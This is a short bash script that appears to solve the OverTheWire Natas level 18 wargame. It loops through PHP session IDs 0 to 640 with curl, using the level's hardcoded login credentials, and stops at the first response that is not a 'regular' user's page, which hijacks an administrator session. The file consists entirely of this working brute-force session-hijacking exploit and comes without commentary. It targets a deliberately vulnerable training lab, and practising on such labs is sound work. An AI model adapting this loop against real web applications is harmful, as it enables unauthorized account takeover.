#!/bin/bash

for i in {0..640}; do
		response=$(curl -s -u natas18:fDGn2A6Gsc0BUp3bZw0RNXpg0PZt40op -b "PHPSESSID=$i" "http://natas18.natas.labs.overthewire.org")
		if [[ "$response" != *"regular"* ]]; then
                	echo $i
			echo $response
			break
		fi
done

